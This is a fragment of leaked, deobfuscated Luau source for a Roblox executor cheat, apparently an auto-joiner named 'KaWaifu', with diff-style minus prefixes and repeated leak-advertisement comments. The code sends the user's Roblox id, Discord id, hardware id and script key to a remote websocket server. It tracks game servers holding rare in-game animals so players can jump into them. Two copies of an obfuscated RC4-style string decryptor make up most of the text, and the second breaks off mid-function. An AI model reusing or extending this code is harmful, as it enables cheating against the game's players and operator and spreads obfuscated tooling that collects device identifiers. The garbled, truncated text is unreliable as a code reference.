L=tonumber(B.Duel);if L then B._duelDisplay=math.floor(L-I);end;end;up_328 [A]=P;up_327 [A]={animals=v.animals,elapsedSeconds=I-P};end;end;end;if type(K.latency)=="table"and type(K.latency.regions)=="table"and up_322.latencyTable then task.spawn(up_322.latencyTable,K.latency.regions,tonumber(K.latency.asof_s)or 0);end;up_320 =H;if e then if up_322.feedReset then pcall(up_322.feedReset);end;up_331 ={};else for B in pairs(up_331 )do if not up_327 [B]then up_331 [B]=nil;if up_322.feedRemove then pcall(up_322.feedRemove,B);end;end;end;end;if K.active_users then task.spawn(up_332 ,K.active_users);if up_333 then task.spawn(up_333 ,K.active_users);end;if up_334 then task.spawn(up_334 ,K.active_users);end;end;local B=game.JobId;local I=if B and B~=""then up_327 [B]~=nil else false;up_335 =not I;if I and up_322.showJoin then local I,e,H=up_327 [B];if I and I.animals then for L,A in ipairs(I.animals)do L=up_336(A.Generation or 0);if not e or L>H then e,H=A,L;end;end;end;if e then pcall(up_322.showJoin,e.DisplayName or"Brainrot",up_337 (e.Generation or 0),"YOU ARE ON");end;end;if up_338 then B={};for I in pairs(up_327 )do B[I]=true;end;task.spawn(up_338 ,B);end;if up_339 then task.defer(up_339 );end;elseif a=="JOB"then local B,I=K._enc;local e={};if B then local H=up_329(B);if H then e,I=H.names or{},if type(H.jid)=="string"then H.jid else I;end;end;local H,L=K.job_start_time,K.payload;if I and L then if L.animals then for A,P in ipairs(L.animals)do P.DisplayName=e[A]or"";end;B=up_330();for e,A in ipairs(L.animals)do e=tonumber(A.Duel);if e then A._duelDisplay=math.floor(e-B);end;end;up_328 [I]=H;up_327 [I]={animals=L.animals,elapsedSeconds=B-H};if up_340 then task.spawn(up_340 ,I);end;if up_339 then task.defer(up_339 );end;end;end;elseif a=="DELETE"then local B=K.job_id;if B then up_327 [B]=nil;up_328 [B]=nil;up_331 [B]=nil;if up_322.feedJoinEnded then pcall(up_322.feedJoinEnded,B);end;if up_322.feedRemove then pcall(up_322.feedRemove,B);end;if up_339 then task.defer(up_339 );end;end;elseif a=="STATUS"then up_321 =os.time();pcall(getgenv().__kawaifu_region_ok);if K.server_time then up_323 ,up_324 =K.server_time-os.time(),true;end;if K.active_users then task.spawn(up_332 ,K.active_users);if up_333 then task.spawn(up_333 ,K.active_users);end;if up_334 then task.spawn(up_334 ,K.active_users);end;end;elseif a=="LAT"then if type(K.regions)=="table"and up_322.latencyTable then task.spawn(up_322.latencyTable,K.regions,tonumber(K.asof_s)or 0);end;elseif a=="KICK"then local B=K.reason or"[KaWaifu AJ AUTH] User is not authorized, reinject the script or reset your HWID";local I=up_341();up_321 =0;up_342 =0;if I then pcall(up_343,I);end;up_344:Kick(B);end;end
-		up_362 = slicedn37
-		local function slicedfn66()if getgenv()._KaWaifuSessionId~=up_345 then return false;end;local B=up_346();if B then pcall(up_347,B);end;up_348 =false;if not up_349 then warn("[KaWaifu] NO WebSocket API in this executor (looked for WebSocket.connect / syn.websocket). Cannot connect.");if up_350.showWsError then pcall(up_350.showWsError,"This executor exposes no WebSocket API (WebSocket.connect / syn.websocket not found).");end;return false;end;local I=getgenv().JoinerConfig_jhgjerdf324sa;if not I.WsUrl then return false;end;B=tostring(up_351.UserId);local e=tostring(math.floor(up_352()));local H,a=up_353 or"unknown","";pcall(function()a=gethwid()or"";end);local K=script_key or"";local L,A=pcall(up_354,B,e,H,a,K);if not L or type(A)~="string"then warn("[KaWaifu Joiner] Could not build the WebSocket signature");return false;end;local P,v=I.WsUrl,tostring(getgenv().KaWaifuActiveRegion or"main");local N=P.."?userId="..B.."&ts="..e.."&sig="..A.."&discordId="..up_355:UrlEncode(H).."&hwid="..up_355:UrlEncode(a).."&key="..up_355:UrlEncode(K);warn("[KaWaifu] WS connect \226\134\146 region '"..v.."'");local e,H=pcall(function()return up_349(N);end);A,L=getgenv()._KaWaifuSessionId~=up_345,tostring(getgenv().KaWaifuActiveRegion or"main")~=v;B=I.WsUrl~=P or L;if A or B then if e and H then pcall(up_347,H);end;if B and not A then warn("[KaWaifu Joiner] A switched-away region attempt completed late \226\128\148 discarded, retrying on the selected edge");end;return false;end;if not e or not H then warn("[KaWaifu Joiner] WS Connection Failed (Ping/Network?): "..up_356(H));pcall(getgenv().__kawaifu_region_fail);if up_350.showWsError then pcall(up_350.showWsError,"Could not connect to the KaWaifu server."..(H and"\10Reason: "..up_356(H)or"\10Reason: network/ping failure (no details from executor)"));end;return false;end;warn("[KaWaifu Joiner] WebSocket Connected Successfully!");if up_350.hideWsError then pcall(up_350.hideWsError);end;up_357 =H;up_348 =true;up_358 =os.time();up_359 =os.time();if getgenv()._KaWaifuSessionId~=up_345 then pcall(up_347,up_346()or H);return false;end;up_360 =false;getgenv()._KaWaifuWS=H;H.OnMessage:Connect(function(B)if getgenv()._KaWaifuSessionId~=up_345 or up_357 ~=H or I.WsUrl~=P or tostring(getgenv().KaWaifuActiveRegion or"main")~=v then return;end;pcall(up_361,B,v);end);H.OnClose:Connect(function()if getgenv()._KaWaifuSessionId~=up_345 then return;end;if up_357 ~=H then return;end;up_348 ,up_357 ,up_359 =false,nil,0;up_362 =0;if getgenv()._KaWaifuWS==H then getgenv()._KaWaifuWS=nil;end;end);pcall(function()H:Send("READY");end);return true;end
-		up_363 = sliced94
-		up_364 = sliced95
-		up_365 = slicedn36  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		up_366 = slicedn37
-		up_367 = slicedfn65
-		up_368 = slicedn38
-		up_369 = slicedfn64
-		local function slicedfn67()if up_363 and up_364 then local B=os.time();if B-up_365 >=25 then pcall(function()up_363 :Send("PING");end);up_365 =B;end;if up_366 >0 and B-up_366 >30 then warn("[WS] No STATUS received in 30s, forcing reconnect");local I=up_367();up_366 ,up_368 =0,0;if I then pcall(up_369,I);end;end;if up_366 ==0 and up_368 >0 and B-up_368 >20 then warn("[WS] No INIT/STATUS within 20s of connect (mute edge), reconnecting");pcall(getgenv().__kawaifu_region_fail);local B=up_367();up_366 ,up_368 =0,0;if B then pcall(up_369,B);end;end;end;end
-		up_370 = slicedfn62
-		up_371 = tbl31
-		up_372 = tbl30
-		local function slicedfn68()local B=up_370();for I,e in pairs(up_371 )do local H=up_372 [I];if H then H.elapsedSeconds=B-e;end;end;end
-
-		local function slicedfn69(arg, arg2, arg3, arg4, arg5)  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			local tbl43 = {}
-			local tbl44 = {}
-			local n = arg
-			local slicedn40 = arg2
-			local v = arg3
-			local sliced108 = arg4
-			local sliced109 = arg5
-			local slicedn41 = 16
-			local tbl45 = nil
-			local char2 = nil  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			local byte = nil
-			local slicedn42 = nil
-			local slicedn43 = nil
-			local slicedn44 = nil
-			local slicedn45 = nil
-			local slicedn46 = nil
-			local slicedn47 = nil
-			local slicedn48 = nil
-			local str15 = nil
-
-			while true do  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				if slicedn41 <= 31 then
-					if slicedn41 <= 15 then
-						if slicedn41 <= 7 then
-							if slicedn41 <= 3 then
-								if slicedn41 <= 1 then
-									if slicedn41 <= 0 then
-										local tbl46 = {}
-
-										if slicedn40 == 1 then
-											slicedn41 = 42
-											slicedn40 = tbl46  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-										else
-											slicedn41 = 57
-											slicedn42 = tbl46
-										end
-									else
-										local sliced110 = tbl45[1]
-										local sliced111 = tbl45[4]
-										local slicedn49 = tbl45[2] + sliced110
-										local flag25 = sliced110 <= 0
-										local flag26 = flag25 and slicedn49 >= sliced111 or not flag25 and slicedn49 <= sliced111  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-										tbl45[2] = slicedn49
-
-										if flag26 then
-											slicedn41 = 8
-										else
-											slicedn41 = 5
-										end
-									end
-								elseif slicedn41 <= 2 then
-									tbl45 = tbl45[1]
-									slicedn41 = 26  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								else
-									slicedn41 = 25
-									slicedn40 = 3661753104396200
-									slicedn43 = 927496312415783
-									slicedn44 = 4503599627370496
-									slicedn45 = 67108864
-									slicedn46 = 17592186044416
-									slicedn47 = 2679385
-									slicedn48 = 22847685
-									tbl45 = { 0, nil, 1, tbl45, 4 }  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								end
-							elseif slicedn41 <= 5 then
-								if slicedn41 <= 4 then
-									byte(str15, 1, 64)
-									slicedn41 = slicedn48 == slicedn47 and 31 or 24
-								else
-									tbl45 = tbl45[5]
-									slicedn41 = 4
-								end
-							elseif slicedn41 <= 6 then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								local slicedn49 = slicedn40 % slicedn45
-								slicedn40 = ((((slicedn40 - slicedn49) / slicedn45 * slicedn47 + slicedn49 * slicedn48) % slicedn45 * slicedn45 + slicedn49 * slicedn47) % slicedn44 + slicedn43) % slicedn44
-								slicedn42[n] = (slicedn40 - slicedn40 % slicedn46) / slicedn46
-								slicedn41 = 10
-							else
-								char2 ..= tbl43[slicedn46]
-								slicedn41 = 11
-							end
-						elseif slicedn41 <= 11 then
-							if slicedn41 <= 9 then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								if slicedn41 <= 8 then
-									slicedn42 = (slicedn44 * slicedn42 + slicedn45) % 4294967296
-									str15 ..= slicedn46[1 + (slicedn42 - slicedn42 % 268435456) / 268435456 % 16]
-									slicedn41 = 1
-								else
-									slicedn40[slicedn42 + 1] = n[slicedn44] * 16 + n[slicedn45]
-									slicedn41 = 27
-								end
-							elseif slicedn41 <= 10 then
-								local sliced110 = tbl45[2]  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								local sliced111 = tbl45[3]
-								local slicedn49 = tbl45[5] + sliced110
-								local flag25 = sliced110 <= 0
-								local flag26 = not flag25
-								local flag27 = slicedn49 >= sliced111
-								local flag28 = slicedn49 <= sliced111
-								flag27 = flag25 and flag27
-								flag28 = flag26 and flag28
-								flag28 = flag27 or flag28
-								tbl45[5] = slicedn49  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-								if flag28 then
-									slicedn41 = 6
-									n = slicedn49
-								else
-									slicedn41 = 2
-								end
-							else
-								local sliced110 = tbl45[3]
-								local sliced111 = tbl45[5]
-								local slicedn49 = tbl45[1] + sliced110  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								local flag25 = sliced110 <= 0
-								local flag26 = not flag25
-								local flag27 = slicedn49 >= sliced111
-								local flag28 = slicedn49 <= sliced111
-								flag27 = flag25 and flag27
-								flag28 = flag26 and flag28
-								flag28 = flag27 or flag28
-								tbl45[1] = slicedn49
-
-								if flag28 then
-									slicedn41 = 28  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-									slicedn42 = slicedn49
-								else
-									slicedn41 = 35
-								end
-							end
-						elseif slicedn41 <= 13 then
-							if slicedn41 <= 12 then
-								n = (n + tbl44[slicedn40] + slicedn42[slicedn40 % 32 + 1]) % 256
-								local sliced110 = tbl44[slicedn40]
-								tbl44[slicedn40] = tbl44[n]  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								tbl44[n] = sliced110
-								slicedn41 = 56
-							else
-								slicedn46 += slicedn44
-								slicedn41 = 18
-							end
-						elseif slicedn41 <= 14 then
-							slicedn42 = (slicedn42 - slicedn45) / 2
-							slicedn43 = (slicedn43 - slicedn47) / 2
-							slicedn45 = slicedn42 % 2  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							slicedn47 = slicedn43 % 2
-
-							if slicedn45 ~= slicedn47 then
-								slicedn41 = 43
-								slicedn44 = 4
-							else
-								slicedn41 = 33
-							end
-						else
-							n = { [56] = 8, [48] = 0, [100] = 13, [52] = 4, [51] = 3, [66] = 11, [67] = 12 }
-							slicedn41 = 55  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							slicedn42 = 49
-							slicedn44 = 1
-						end
-
-						continue
-					end
-
-					if slicedn41 <= 23 then
-						if slicedn41 <= 19 then
-							if slicedn41 <= 17 then
-								if slicedn41 <= 16 then
-									char2 = string.char  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-									byte = string.byte
-
-									if slicedn40 == 2 then
-										slicedn41 = 26
-										slicedn42 = n
-									else
-										slicedn41 = 0
-									end
-								else
-									slicedn41 = 11
-									n = 0  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-									slicedn40 = 0
-									char2 = ""
-									tbl45 = { 0, nil, 1, tbl45, #v + 0 }
-								end
-							elseif slicedn41 <= 18 then
-								slicedn42 = (slicedn42 - slicedn45) / 2
-								slicedn43 = (slicedn43 - slicedn47) / 2
-								slicedn45 = slicedn42 % 2
-								slicedn47 = slicedn43 % 2
-
-								if slicedn45 ~= slicedn47 then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-									slicedn41 = 54
-									slicedn44 = 128
-								else
-									slicedn41 = 7
-								end
-							else
-								sliced108[sliced109] = char2
-								slicedn41 = 34
-							end
-						elseif slicedn41 <= 21 then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							if slicedn41 <= 20 then
-								tbl45 = tbl45[4]
-								slicedn41 = 17
-							else
-								slicedn41 = 1
-								str15 = ""
-								tbl45 = { 1, 0, nil, 64, tbl45 }
-							end
-						elseif slicedn41 <= 22 then
-							slicedn42 = (slicedn42 - slicedn45) / 2  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							slicedn43 = (slicedn43 - slicedn47) / 2
-							slicedn45 = slicedn42 % 2
-							slicedn47 = slicedn43 % 2
-
-							if slicedn45 ~= slicedn47 then
-								slicedn41 = 32
-								slicedn44 = 32
-							else
-								slicedn41 = 58
-							end
-						else  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							str15 += 65536
-							slicedn41 = 51
-						end
-
-						continue
-					end
-
-					if slicedn41 <= 27 then
-						if slicedn41 <= 25 then
-							if slicedn41 <= 24 then
-								local sliced110 = tbl45[1]
-								local sliced111 = tbl45[3]  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								local slicedn49 = tbl45[5] + sliced110
-								local flag25 = sliced110 <= 0
-								local flag26 = flag25 and slicedn49 >= sliced111 or not flag25 and slicedn49 <= sliced111
-								tbl45[5] = slicedn49
-
-								if flag26 then
-									slicedn41 = 21
-									slicedn48 = slicedn49
-								else
-									slicedn41 = 62
-								end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							else
-								local sliced110 = tbl45[3]
-								local sliced111 = tbl45[5]
-								local slicedn49 = tbl45[1] + sliced110
-								local flag25 = sliced110 <= 0
-								local flag26 = not flag25
-								local flag27 = slicedn49 >= sliced111
-								local flag28 = slicedn49 <= sliced111
-								flag27 = flag25 and flag27
-								flag27 = flag27 or flag26 and flag28  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								tbl45[1] = slicedn49
-
-								if flag27 then
-									slicedn41 = 50
-									str15 = slicedn49
-								else
-									slicedn41 = 60
-								end
-							end
-						elseif slicedn41 <= 26 then
-							n = slicedn42[3]  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							slicedn40 = 4 * (slicedn42[1] % 64) + 1
-							slicedn43 = 2 * (slicedn42[2] % 128) - 1
-							slicedn41 = 52
-							tbl45 = { 1, -1, nil, 255, tbl45 }
-						else
-							local sliced110 = tbl45[4]
-							local sliced111 = tbl45[3]
-							local slicedn49 = tbl45[2] + sliced110
-							local flag25 = sliced110 <= 0
-							local flag26 = flag25 and slicedn49 >= sliced111 or not flag25 and slicedn49 <= sliced111  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							tbl45[2] = slicedn49
-
-							if flag26 then
-								slicedn41 = 63
-								slicedn42 = slicedn49
-							else
-								slicedn41 = 53
-							end
-						end
-
-						continue
-					end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-					if slicedn41 <= 29 then
-						if slicedn41 <= 28 then
-							n = (n + 1) % 256
-							slicedn40 = (slicedn40 + tbl44[n]) % 256
-							local sliced110 = tbl44[n]
-							tbl44[n] = tbl44[slicedn40]
-							tbl44[slicedn40] = sliced110
-							local sliced111 = byte(v, slicedn42)
-							slicedn43 = tbl44[(tbl44[n] + tbl44[slicedn40]) % 256]
-							slicedn44 = sliced111 % 2  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							slicedn45 = slicedn43 % 2
-
-							if slicedn44 ~= slicedn45 then
-								slicedn41 = 44
-								slicedn42 = sliced111
-							else
-								slicedn41 = 38
-								slicedn46 = 0
-								slicedn42 = sliced111
-							end
-
-							continue  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						end
-
-						return nil
-					end
-
-					if slicedn41 <= 30 then
-						slicedn46 += slicedn44
-						slicedn41 = 39
-					else
-						slicedn43 = { byte(n, 1, 64) }
-						slicedn41 = 24
-					end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				else
-					if slicedn41 <= 47 then
-						if slicedn41 <= 39 then
-							if slicedn41 <= 35 then
-								if slicedn41 <= 33 then
-									if slicedn41 <= 32 then
-										slicedn46 += slicedn44
-										slicedn41 = 58
-									else
-										slicedn42 = (slicedn42 - slicedn45) / 2  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-										slicedn43 = (slicedn43 - slicedn47) / 2
-										slicedn45 = slicedn42 % 2
-										slicedn47 = slicedn43 % 2
-
-										if slicedn45 ~= slicedn47 then
-											slicedn41 = 30
-											slicedn44 = 8
-										else
-											slicedn41 = 39
-										end
-									end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-									continue
-								end
-
-								if slicedn41 <= 34 then
-									return
-								end
-								tbl45 = tbl45[4]
-								slicedn41 = 19
-								continue
-							end
-
-							if slicedn41 <= 37 then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								if slicedn41 <= 36 then
-									slicedn41 = not slicedn45 and 61 or 9
-								else
-									tbl45 = tbl45[5]
-									slicedn41 = 59
-								end
-							elseif slicedn41 <= 38 then
-								slicedn42 = (slicedn42 - slicedn44) / 2
-								slicedn43 = (slicedn43 - slicedn45) / 2
-								slicedn45 = slicedn42 % 2  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								slicedn47 = slicedn43 % 2
-
-								if slicedn45 ~= slicedn47 then
-									slicedn41 = 49
-									slicedn44 = 2
-								else
-									slicedn41 = 14
-								end
-							else
-								slicedn42 = (slicedn42 - slicedn45) / 2
-								slicedn43 = (slicedn43 - slicedn47) / 2  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								slicedn45 = slicedn42 % 2
-								slicedn47 = slicedn43 % 2
-
-								if slicedn45 ~= slicedn47 then
-									slicedn41 = 48
-									slicedn44 = 16
-								else
-									slicedn41 = 22
-								end
-							end
-
-							continue  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						end
-
-						if slicedn41 <= 43 then
-							if slicedn41 <= 41 then
-								if slicedn41 <= 40 then
-									str15 -= 65536
-									slicedn41 = 47
-								else
-									n[slicedn42] = slicedn44
-									n[69] = 14
-									n[55] = 7  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-									n[53] = 5
-									n[57] = 9
-									n[99] = 12
-									n[54] = 6
-									slicedn41 = 27
-									tbl45 = { tbl45, -1, 31, 1, nil }
-								end
-							elseif slicedn41 <= 42 then
-								slicedn43 = {}
-
-								slicedn46 = {  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-									"a",
-									"6",
-									"b",
-									"3",
-									"5",
-									"e",
-									"2",
-									"0",
-									"d",
-									"1",  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-									"7",
-									"f",
-									"4",
-									"8",
-									"c",
-									"9",
-								}
-
-								slicedn41 = 24
-								slicedn42 = 3846715392
-								slicedn44 = -2141334987  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								slicedn45 = -1976388651
-								slicedn47 = 1
-								tbl45 = { 1, tbl45, 128, nil, 0 }
-							else
-								slicedn46 += slicedn44
-								slicedn41 = 33
-							end
-						elseif slicedn41 <= 45 then
-							if slicedn41 <= 44 then
-								slicedn41 = 38  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								slicedn46 = 1
-							else
-								slicedn41 = 10
-								tbl45 = { tbl45, 1, 32, nil, 0 }
-							end
-						elseif slicedn41 <= 46 then
-							tbl43[n] = char2(n)
-							tbl44[n] = n
-							n = (slicedn40 * n + slicedn43) % 256
-							slicedn41 = 52  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						else
-							n = (n - str15) / 65536
-							local slicedn49 = (slicedn40 + str15) % slicedn44
-							local slicedn50 = slicedn49 % slicedn45
-							slicedn40 = ((((slicedn49 - slicedn50) / slicedn45 * slicedn47 + slicedn50 * slicedn48) % slicedn45 * slicedn45 + slicedn50 * slicedn47) % slicedn44 + slicedn43) % slicedn44
-							slicedn41 = 25
-						end
-
-						continue
-					end
-
-					if slicedn41 <= 55 then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						if slicedn41 <= 51 then
-							if slicedn41 <= 49 then
-								if slicedn41 <= 48 then
-									slicedn46 += slicedn44
-									slicedn41 = 22
-								else
-									slicedn46 += slicedn44
-									slicedn41 = 14
-								end
-							elseif slicedn41 <= 50 then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								str15 = n % 65536
-								slicedn41 = str15 < 0 and 23 or 51
-							else
-								slicedn41 = str15 >= 65536 and 40 or 47
-							end
-						elseif slicedn41 <= 53 then
-							if slicedn41 <= 52 then
-								local sliced110 = tbl45[1]
-								local sliced111 = tbl45[4]
-								local slicedn49 = tbl45[2] + sliced110  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								local flag25 = sliced110 <= 0
-								local flag26 = not flag25
-								local flag27 = slicedn49 >= sliced111
-								local flag28 = slicedn49 <= sliced111
-								flag27 = flag25 and flag27
-								flag27 = flag27 or flag26 and flag28
-								tbl45[2] = slicedn49
-
-								if flag27 then
-									slicedn41 = 46
-									slicedn44 = slicedn49  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								else
-									slicedn41 = 37
-								end
-							else
-								tbl45 = tbl45[1]
-								slicedn41 = 26
-								slicedn42 = slicedn40
-							end
-						elseif slicedn41 <= 54 then
-							slicedn46 += slicedn44  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							slicedn41 = 7
-						else
-							n[slicedn42] = slicedn44
-							n[50] = 2
-							n[102] = 15
-							n[98] = 11
-							n[68] = 13
-							n[101] = 14
-							n[70] = 15
-							n[65] = 10  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							slicedn41 = 41
-							slicedn42 = 97
-							slicedn44 = 10
-						end
-
-						continue
-					end
-
-					if slicedn41 <= 59 then
-						if slicedn41 <= 57 then
-							if slicedn41 <= 56 then
-								local sliced110 = tbl45[3]  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								local sliced111 = tbl45[1]
-								local slicedn49 = tbl45[5] + sliced110
-								local flag25 = sliced110 <= 0
-								local flag26 = flag25 and slicedn49 >= sliced111 or not flag25 and slicedn49 <= sliced111
-								tbl45[5] = slicedn49
-
-								if flag26 then
-									slicedn41 = 12
-									slicedn40 = slicedn49
-								else
-									slicedn41 = 20  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								end
-							else
-								slicedn41 = slicedn40 == 0 and 3 or 26
-							end
-						elseif slicedn41 <= 58 then
-							slicedn42 = (slicedn42 - slicedn45) / 2
-							slicedn43 = (slicedn43 - slicedn47) / 2
-							slicedn45 = slicedn42 % 2
-							slicedn47 = slicedn43 % 2
-
-							if slicedn45 ~= slicedn47 then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								slicedn41 = 13
-								slicedn44 = 64
-							else
-								slicedn41 = 18
-							end
-						else
-							slicedn41 = 56
-							n = 0
-							tbl45 = { 255, nil, 1, tbl45, -1 }
-						end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-						continue
-					end
-
-					if slicedn41 <= 61 then
-						if slicedn41 <= 60 then
-							tbl45 = tbl45[4]
-							slicedn41 = 45
-							continue
-						end
-
-						break
-					end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-					if slicedn41 <= 62 then
-						tbl45 = tbl45[2]
-						slicedn41 = 15
-					else
-						local slicedn49 = slicedn42 * 2 + 1
-						local sliced110 = slicedn43[slicedn49]
-						local sliced111 = slicedn43[slicedn49 + 1]
-
-						if not sliced110 then
-							slicedn41 = 29
-						else  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							slicedn41 = 36
-							slicedn44 = sliced110
-							slicedn45 = sliced111
-						end
-					end
-				end
-			end
-
-			return nil
-		end
-
-		local function slicedfn70(arg, arg2, arg3, arg4, arg5)  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			local tbl43 = {}
-			local tbl44 = {}
-			local n = arg
-			local slicedn40 = arg2
-			local v = arg3
-			local sliced108 = arg4
-			local sliced109 = arg5
-			local slicedn41 = 16
-			local tbl45 = nil
-			local char2 = nil  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			local byte = nil
-			local slicedn42 = nil
-			local slicedn43 = nil
-			local slicedn44 = nil
-			local slicedn45 = nil
-			local slicedn46 = nil
-			local slicedn47 = nil
-			local slicedn48 = nil
-			local str15 = nil
-
-			while true do  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				if slicedn41 <= 31 then
-					if slicedn41 <= 15 then
-						if slicedn41 <= 7 then
-							if slicedn41 <= 3 then
-								if slicedn41 <= 1 then
-									if slicedn41 <= 0 then
-										local tbl46 = {}
-
-										if slicedn40 == 1 then
-											slicedn41 = 42
-											slicedn40 = tbl46  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-										else
-											slicedn41 = 57
-											slicedn42 = tbl46
-										end
-									else
-										local sliced110 = tbl45[1]
-										local sliced111 = tbl45[4]
-										local slicedn49 = tbl45[2] + sliced110
-										local flag25 = sliced110 <= 0
-										local flag26 = flag25 and slicedn49 >= sliced111 or not flag25 and slicedn49 <= sliced111  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-										tbl45[2] = slicedn49
-
-										if flag26 then
-											slicedn41 = 8
-										else
-											slicedn41 = 5
-										end
-									end
-								elseif slicedn41 <= 2 then
-									tbl45 = tbl45[1]
-									slicedn41 = 26  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								else
-									slicedn41 = 25
-									slicedn40 = 3661753104396200
-									slicedn43 = 927496312415783
-									slicedn44 = 4503599627370496
-									slicedn45 = 67108864
-									slicedn46 = 17592186044416
-									slicedn47 = 2679385
-									slicedn48 = 22847685
-									tbl45 = { 0, nil, 1, tbl45, 4 }  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								end
-							elseif slicedn41 <= 5 then
-								if slicedn41 <= 4 then
-									byte(str15, 1, 64)
-									slicedn41 = slicedn48 == slicedn47 and 31 or 24
-								else
-									tbl45 = tbl45[5]
-									slicedn41 = 4
-								end
-							elseif slicedn41 <= 6 then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								local slicedn49 = slicedn40 % slicedn45
-								slicedn40 = ((((slicedn40 - slicedn49) / slicedn45 * slicedn47 + slicedn49 * slicedn48) % slicedn45 * slicedn45 + slicedn49 * slicedn47) % slicedn44 + slicedn43) % slicedn44
-								slicedn42[n] = (slicedn40 - slicedn40 % slicedn46) / slicedn46
-								slicedn41 = 10
-							else
-								char2 ..= tbl43[slicedn46]
-								slicedn41 = 11
-							end
-						elseif slicedn41 <= 11 then
-							if slicedn41 <= 9 then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								if slicedn41 <= 8 then
-									slicedn42 = (slicedn44 * slicedn42 + slicedn45) % 4294967296
-									str15 ..= slicedn46[1 + (slicedn42 - slicedn42 % 268435456) / 268435456 % 16]
-									slicedn41 = 1
-								else
-									slicedn40[slicedn42 + 1] = n[slicedn44] * 16 + n[slicedn45]
-									slicedn41 = 27
-								end
-							elseif slicedn41 <= 10 then
-								local sliced110 = tbl45[2]  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								local sliced111 = tbl45[3]
-								local slicedn49 = tbl45[5] + sliced110
-								local flag25 = sliced110 <= 0
-								local flag26 = not flag25
-								local flag27 = slicedn49 >= sliced111
-								local flag28 = slicedn49 <= sliced111
-								flag27 = flag25 and flag27
-								flag28 = flag26 and flag28
-								flag28 = flag27 or flag28
-								tbl45[5] = slicedn49  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-								if flag28 then
-									slicedn41 = 6
-									n = slicedn49
-								else
-									slicedn41 = 2
-								end
-							else
-								local sliced110 = tbl45[3]
-								local sliced111 = tbl45[5]
-								local slicedn49 = tbl45[1] + sliced110  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								local flag25 = sliced110 <= 0
-								local flag26 = not flag25
-								local flag27 = slicedn49 >= sliced111
-								local flag28 = slicedn49 <= sliced111
-								flag27 = flag25 and flag27
-								flag28 = flag26 and flag28
-								flag28 = flag27 or flag28
-								tbl45[1] = slicedn49
-
-								if flag28 then
-									slicedn41 = 28  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-									slicedn42 = slicedn49
-								else
-									slicedn41 = 35
-								end
-							end
-						elseif slicedn41 <= 13 then
-							if slicedn41 <= 12 then
-								n = (n + tbl44[slicedn40] + slicedn42[slicedn40 % 32 + 1]) % 256
-								local sliced110 = tbl44[slicedn40]
-								tbl44[slicedn40] = tbl44[n]  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								tbl44[n] = sliced110
-								slicedn41 = 56
-							else
-								slicedn46 += slicedn44
-								slicedn41 = 18
-							end
-						elseif slicedn41 <= 14 then
